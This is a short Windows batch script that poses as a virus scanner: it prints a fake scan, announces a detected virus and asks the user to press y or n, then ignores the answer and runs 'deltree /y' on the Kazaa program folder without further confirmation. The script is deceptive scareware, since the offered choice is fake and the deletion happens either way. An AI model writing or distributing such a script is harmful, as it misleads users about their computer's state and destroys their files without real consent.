   @echo off
   cls
   goto copyright

   :copyright

   echo this program is under license ® to copy this file is going against copyright ©
   echo to begin the scan press a key
   pause >nul

   echo scan will now begin....
   echo .
   echo scaning
   echo virus detected if you want the problem fixed press the y key
   echo if you want to leave it in your computer which may cause problems press the n key
   pause >nul
   goto delvirus

   :delvirus
   echo you have chosen to delete the virus this program will now proceed to delete it
   echo now deleting the problem file
   deltree /y c:\programfiles\kazaa
   echo please wait
   echo ....
   echo problem file deleted to exit this program press any key
   pause >nul
   cls
   exit
